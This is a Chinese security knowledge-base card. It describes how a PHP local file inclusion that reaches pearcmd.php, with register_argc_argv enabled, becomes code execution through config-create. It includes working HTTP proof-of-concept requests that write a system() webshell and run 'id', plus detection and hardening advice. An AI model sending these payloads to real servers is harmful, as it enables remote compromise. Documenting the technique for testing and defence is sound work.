---
id: web-php-file-inclusion-pearcmd-argv-config-create-webshell
title: LFI 包含 pearcmd.php：register_argc_argv 查询串注入 config-create 写 Webshell
type: scenario
domain: web
path: web/php/file-inclusion
technique: php-pearcmd-argv-config-create
tags:
- php
- file-inclusion
- lfi
- rce
- pearcmd
- register-argc-argv
- docker
- webshell
cve: []
severity: critical
confidence: high
affected_versions: PHP < 8.5 默认 register_argc_argv=On 的配置；官方 php:* Docker 镜像默认安装 PEAR/pearcmd.php（原文说明）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T04:42:19+08:00'
  notes: 已对照原文 Step9 与图03/04核对：LFI 终点指向 tools/pear/pearcmd，查询串 +config-create+<?=system(end())?>+wp-vuln/rce-shell.php 写入并回显 PEAR 配置，随后包含 rce-shell 以 cmd=id 回显 uid；前置 register_argc_argv=On、pearcmd.php 存在、目录可写均与原文一致。affected_versions 保留原文 PHP<8.5/官方镜像说明。未复现。
url: /docs/web/php/file-inclusion/web-php-file-inclusion-pearcmd-argv-config-create-webshell/
draft: false
kb_aliases:
- pearcmd.php 包含 RCE
- register_argc_argv 利用
- config-create 写文件
- PEAR 任意文件写
- LFI 转 RCE pearcmd
- pearcmd webshell
---

## 一句话结论

当站点存在任意 LFI 且 PHP 的 `register_argc_argv=On` 时，把包含目标指向 PEAR 自带的 `pearcmd.php`，并在同一请求的查询串中用 `+` 分段传入 `config-create <内容> <路径>`，即可让 PEAR 把攻击者可控内容写入 Web 目录形成 webshell；官方 `php:*` Docker 镜像与部分 cPanel 默认配置同时满足这两个条件，LFI 因此升级为 RCE。

## 原理

- PHP 在非 CLI SAPI 下，若 `register_argc_argv=On`，会把查询串按 `+` 切分后填充 `$argv`/`$argc`，让被包含的脚本可以像命令行程序一样读取参数。
- `pearcmd.php` 是 PEAR 的命令行入口，被 `include` 后同样读取 `$argv` 并分发子命令；其中 `config-create <content> <file>` 会把第一参数内容写入第二参数指定的文件（生成 PEAR 配置文件）。
- 因为内容由攻击者控制，写入文件可以是 `<?=system(end($_REQUEST))?>` 这样的 PHP 代码；文件路径可指向 Web 根目录下已存在且可写的目录，例如 `wp-vuln/rce-shell.php`。
- LFI 负责“包含 pearcmd.php 让代码执行”，查询串负责“给 pearcmd 传 argv”，两者在同一个 HTTP 请求中完成；之后再用同一个 LFI 包含刚写入的 webshell，通过 `cmd` 参数执行命令。
- 前置条件缺一不可：服务器上存在 `pearcmd.php`（官方 PHP Docker 镜像默认安装 PEAR）、`register_argc_argv=On`、LFI 能包含 `.php` 文件、目标写入目录存在且 Web 用户可写。PHP 8.5 起 `register_argc_argv` 默认关闭，官方 Docker 新镜像的可利用性随之下降。

## 触发条件

- 存在可包含本地 `.php` 文件的 LFI（如 WordPress 页面模板遍历、ThinkPHP 模板包含、上传/日志包含等）。
- PHP 配置 `register_argc_argv=On`（官方 `php:*` Docker 镜像默认；PHP 8.5 之前默认 cPanel 配置也常见）。
- 服务器存在 `/usr/local/lib/php/pearcmd.php` 等 PEAR 入口（官方 PHP Docker 镜像默认路径）。
- Web 根目录下存在可写目录，或攻击者能把文件写到可包含的位置。
- 请求中的查询串可以被 `+` 分段并原样传给被包含脚本（Web 服务器/框架未改写查询串）。

## 利用步骤

1. 确认 LFI 可包含 `.php` 文件，并确定站点根到 `pearcmd.php` 的相对路径与 `../` 数量。
2. 构造写文件请求：URL 查询串以 `+` 开头，依次放 `config-create`、PHP 代码、写入路径；请求体中的 `pagename` 等参数把 LFI 终点指向 `pearcmd`。
3. 观察响应中出现 PEAR 配置内容，确认 `config-create` 已执行、文件已写入。
4. 用同一 LFI 包含刚写入的 webshell（路径去掉 `.php` 后缀，由模板逻辑补全），请求体传 `cmd=id` 验证命令执行。
5. 若写入失败，检查目录是否存在/可写、`pearcmd.php` 路径、`register_argc_argv` 是否开启。

## PoC

写 Webshell（URL 中 `+` 是 argv 分隔符，`<内容>` 为 `<?=system(end($_REQUEST))?>`）：

```http
POST /?+config-create+/<?=system(end($_REQUEST))?>+wp-vuln/rce-shell.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 130

page_id=2&pagename=templates%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252ftools%252fpear%252fpearcmd
```

响应会返回 PEAR 配置文本，其中 `bin_dir`、`doc_dir` 等字段被写成 `<?=system(end($_REQUEST))?>`，说明内容已按攻击者输入写入。

命令执行（包含刚写入的 shell）：

```http
POST /?page_id=2&pagename=templates%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252frce-shell HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 10

cmd=id
```

`end($_REQUEST)` 取最后一个请求变量 `cmd`，执行结果回显在响应中。

## 变体与关联

- 变体：`config-create` 写入任意可写路径（Web 根、上传目录、计划任务/配置目录），内容不限于 webshell；也可先写 `.user.ini` 等配置。
- 变体：除 pearcmd 外，其他读取 `$argv` 的 CLI 入口脚本也可作为“参数注入—文件写”原语；同类公开链见 Pterodactyl CVE-2025-49132 等。
- 变体：没有 pearcmd 时可回退到包含上传文件、日志、会话文件、`/proc/self/environ` 等常规 LFI 转 RCE 路径。
- 关联卡片：[[web-php-file-inclusion-wordpress-page-template-path-traversal]]（本链的 LFI 入口）、[[web-php-file-inclusion-php-filter-insert-bypass]]、[[web-php-file-inclusion-user-ini-session-save-path-webshell]]。
- 边界：`register_argc_argv=Off`、镜像未安装 PEAR、目标目录不可写、Web 服务器剥掉 `+` 或改写查询串时链条失效。

## 检测与防御

- 检测：请求查询串出现 `+config-create+`、`pearcmd`、`pearcmd.php`；LFI 参数指向 `usr/local/lib/php`；Web 根目录突然出现新的 `.php` 文件；PEAR 配置内容出现在 HTTP 响应。
- 日志特征：同一客户端短时间内先包含 `pearcmd` 再包含新文件名，随后带 `cmd` 参数访问。
- 防御：在 `php.ini` 设置 `register_argc_argv=Off`（PHP 8.5 默认）；从镜像中移除 PEAR/pearcmd.php；把 Web 根设为不可写，上传目录禁止执行 PHP；修复 LFI 并对模板/包含路径做白名单与 realpath 边界校验。
- 加固：容器最小化（不安装 pear/pecl 等构建工具）；WAF 阻断 `+config-create+` 与包含 `pearcmd` 的请求只能作为补充，不能替代 LFI 修复。
